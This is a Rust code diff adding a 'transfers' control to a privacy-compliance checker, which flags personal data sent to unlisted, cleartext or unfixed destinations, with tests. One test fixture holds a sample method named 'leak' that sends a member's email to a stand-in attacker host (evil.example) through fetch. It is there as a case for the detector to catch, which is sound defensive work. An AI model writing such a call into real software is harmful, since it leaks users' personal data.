@@ -21,6 +21,7 @@ const CHECKS: &[(&str, &str)] = &[
     ("audit-log", "who read or changed personal data is logged, under a key kept apart from the data; checked when the server starts"),
     ("encryption-at-rest", "stored data is encrypted, under a key kept apart from the data; checked when the server starts"),
     ("encryption-in-transit", "the server is reached over TLS, or only from this machine; checked when the server starts"),
+    ("transfers", "personal data leaves the server only for destinations the pack lists, each with its basis"),
 ];
 
 /// A pack, with the packs it extends merged in.
@@ -37,6 +38,9 @@ pub struct Pack {
     pub special_bases: Option<BTreeSet<String>>,
     pub controls: Vec<Control>,
     pub not_covered: Vec<String>,
+    /// Where personal data may be sent: a host (`api.example.com`, `*.example.com`) or a
+    /// plugin module (`tj:ai`), with the basis that allows it.
+    pub transfers: Vec<(String, String)>,
 }
 
 #[derive(Debug, Clone, PartialEq)]
@@ -126,6 +130,17 @@ impl Pack {
             });
         }
         self.not_covered.extend(strings(&json["notCovered"]).map_err(|e| bad(&format!("\"notCovered\" {e}")))?);
+        for (i, t) in json["transfers"].as_array().map(Vec::as_slice).unwrap_or_default().iter().enumerate() {
+            let bad = |what: &str| bad(&format!("transfer {}: {what}", i + 1));
+            let to = t["to"].as_str().filter(|s| !s.is_empty()).ok_or_else(|| bad("needs \"to\": a host, *.domain, or a plugin such as tj:ai"))?;
+            // A wildcard covers the subdomains of one registered domain, never a whole suffix.
+            let rest = to.strip_prefix("*.").unwrap_or(to);
+            if rest.contains('*') || (to.starts_with("*.") && (rest.split('.').count() < 2 || rest.split('.').any(str::is_empty))) {
+                return Err(bad(&format!("\"{to}\" is too broad: name a host, or *.domain.tld for the subdomains of one domain")));
+            }
+            let basis = t["basis"].as_str().filter(|s| !s.trim().is_empty()).ok_or_else(|| bad("needs \"basis\": why this transfer is allowed (adequacy, safeguards, a contract)"))?;
+            self.transfers.push((to.to_ascii_lowercase(), basis.to_string()));
+        }
         let controls = json["controls"].as_array().ok_or_else(|| bad("needs \"controls\", a list"))?;
         for (i, c) in controls.iter().enumerate() {
             let bad = |what: &str| bad(&format!("control {}: {what}", i + 1));
@@ -147,7 +162,8 @@ impl Pack {
     /// Each control with its verdict, for an app; `server` when a server is starting.
     pub fn evaluate(&self, src: &str, program: &Program, server: Option<&Server>) -> Vec<(&Control, Verdict)> {
         let special_bases = self.special_bases.clone().unwrap_or_else(|| BTreeSet::from(["consent".to_string()]));
-        let bases = tj_core::lawful_bases(src);
+        let facts = tj_core::facts(src);
+        let bases = facts.lawful_basis;
         let held: Vec<_> = program.objects.iter().filter(|o| !o.pii.is_empty()).collect();
         let basis_of = |purpose: &str| bases.as_ref().and_then(|b| b.iter().find(|(p, _)| p == purpose).map(|(_, b)| b.clone()));
         self.controls
@@ -194,6 +210,7 @@ impl Pack {
                     }
                     "subject-rights" => Verdict::Met("built in: tj privacy export|erase, and tj:privacy in app code".into()),
                     "records" => Verdict::Met("built in: tj check --privacy --record".into()),
+                    "transfers" => self.transfers_verdict(src, &facts.transfers),
                     "audit-log" => match server {
                         None => Verdict::AtServe,
                         Some(s) if s.audit_key_apart => Verdict::Met("on, with its key kept apart from the data".into()),
@@ -215,6 +232,42 @@ impl Pack {
                 (c, v)
             })
             .collect()
+    }
+
+    /// Every transfer must be to a destination the pack allows.
+    fn transfers_verdict(&self, src: &str, transfers: &[tj_core::Transfer]) -> Verdict {
+        if transfers.is_empty() {
+            return Verdict::Met("personal data is not sent outside the server".into());
+        }
+        let mut problems = Vec::new();
+        let mut allowed = BTreeSet::new();
+        for t in transfers {
+            let at = crate::privacy::place(src, t.at);
+            let what = t.fields.join(", ");
+            let name = match &t.to {
+                tj_core::Destination::Host(h) => h.clone(),
+                tj_core::Destination::Cleartext(h) => {
+                    problems.push(format!("{at} sends {what} to {h} over plain HTTP, readable on the way; use https://"));
+                    continue;
+                }
+                tj_core::Destination::Plugin(m) => m.clone(),
+                tj_core::Destination::Unknown => {
+                    problems.push(format!("{at} sends {what} to a URL whose host the code does not fix; write the host out, as in fetch(`https://api.example.com/...`)"));
+                    continue;
+                }
+            };
+            match self.transfers.iter().find(|(to, _)| matches(to, &name)) {
+                Some((_, basis)) => {
+                    allowed.insert(format!("{name} ({basis})"));
+                }
+                None => problems.push(format!("{at} sends {what} to {}; list \"{name}\" in the pack's \"transfers\" with its basis, or stop sending it", crate::privacy::destination(&t.to))),
+            }
+        }
+        if problems.is_empty() {
+            Verdict::Met(format!("sent only to listed destinations: {}", allowed.into_iter().collect::<Vec<_>>().join(", ")))
+        } else {
+            Verdict::NotMet(problems.join("; "))
+        }
     }
 
     /// The report `tj check --compliance` prints, and whether every checked control is met.
@@ -250,6 +303,14 @@ impl Pack {
             }
         }
         (out, ok)
+    }
+}
+
+/// Whether a pack's destination (`api.example.com`, `*.example.com`, `tj:ai`) covers `name`.
+fn matches(allowed: &str, name: &str) -> bool {
+    match allowed.strip_prefix("*.") {
+        Some(domain) => name.strip_suffix(domain).is_some_and(|sub| sub.ends_with('.') && sub.len() > 1),
+        None => allowed == name,
     }
 }
 
@@ -298,6 +359,42 @@ mod tests {
         assert!(Pack::load(&d.join("bad-special.json")).unwrap_err().contains("\"sexuality\", which is not a @pii category"));
         write("bad-basis.json", r#"{ "name": "x", "effective": "2020-01-01", "specialBases": ["because"], "controls": [] }"#);
         assert!(Pack::load(&d.join("bad-basis.json")).unwrap_err().contains("not a lawful basis"));
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    #[test]
+    fn the_example_meets_its_packs_apart_from_what_the_server_checks() {
+        let example = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples/members");
+        let src = std::fs::read_to_string(example.join("app.tj")).unwrap();
+        let program = tj_core::compile(&src).unwrap();
+        let pack = Pack::load(&example.join("club.pack.json")).unwrap();
+        let (r, ok) = pack.report(&pack.evaluate(&src, &program, None));
+        assert!(ok && r.contains("met       transfers: sent only to listed destinations: api.mailer.example"), "{r}");
+        let regional = Pack::load(&example.join("gdpr-eu.sample.json")).unwrap();
+        let (r, ok) = regional.report(&regional.evaluate(&src, &program, None));
+        assert!(!ok && r.contains("NOT MET   transfers"), "the regional pack alone lists no providers: {r}");
+    }
+
+    #[test]
+    fn personal_data_goes_only_where_the_pack_allows() {
+        let d = dir("transfers");
+        std::fs::write(d.join("base.json"), r#"{ "name": "base", "effective": "2018-05-25", "controls": [{ "check": "transfers", "source": "art. 44" }] }"#).unwrap();
+        std::fs::write(d.join("org.json"), r#"{ "name": "org", "effective": "2025-01-01", "extends": ["base.json"], "controls": [], "transfers": [{ "to": "*.mailer.example", "basis": "processor contract, EU" }, { "to": "tj:ai", "basis": "DPA with the provider" }] }"#).unwrap();
+        let src = "import { complete } from \"tj:ai\"\n@server @read(\"owner\") object Member {\n  @pii(\"contact\", \"account\") email: string = \"\"\n  @allow(\"owner\") async welcome() {\n    await fetch(\"https://eu.mailer.example/send\", { method: \"POST\", body: reveal(this.email, \"account\") })\n  }\n  @allow(\"owner\") async ask(): any { return await complete(reveal(this.email, \"account\"), [], []) }\n  @allow(\"owner\") async track(url: string) { await fetch(url, { body: reveal(this.email, \"account\") }) }\n  @allow(\"owner\") async leak() { await fetch(`https://evil.example/${reveal(this.email, \"account\")}`) }\n}\n";
+        let program = tj_core::compile(src).unwrap();
+        let (r, ok) = Pack::load(&d.join("base.json")).map(|p| p.report(&p.evaluate(src, &program, None))).unwrap();
+        assert!(!ok && r.contains("app.tj:5 sends Member.email to eu.mailer.example; list \"eu.mailer.example\""), "{r}");
+        let pack = Pack::load(&d.join("org.json")).unwrap();
+        let (r, ok) = pack.report(&pack.evaluate(src, &program, None));
+        assert!(!ok, "{r}");
+        assert!(!r.contains("eu.mailer.example;") && !r.contains("tj:ai;"), "allowed by the org's pack: {r}");
+        assert!(r.contains("app.tj:8 sends Member.email to a URL whose host the code does not fix"), "{r}");
+        assert!(r.contains("app.tj:9 sends Member.email to evil.example"), "{r}");
+        assert!(matches("*.mailer.example", "eu.mailer.example") && !matches("*.mailer.example", "mailer.example") && !matches("*.mailer.example", "evilmailer.example"));
+        for broad in ["*", "*.", "*.com", "a*.example.com", "*..com"] {
+            std::fs::write(d.join("broad.json"), format!(r#"{{ "name": "b", "effective": "2025-01-01", "controls": [], "transfers": [{{ "to": "{broad}", "basis": "x" }}] }}"#)).unwrap();
+            assert!(Pack::load(&d.join("broad.json")).unwrap_err().contains("too broad"), "{broad}");
+        }
         let _ = std::fs::remove_dir_all(&d);
     }
 
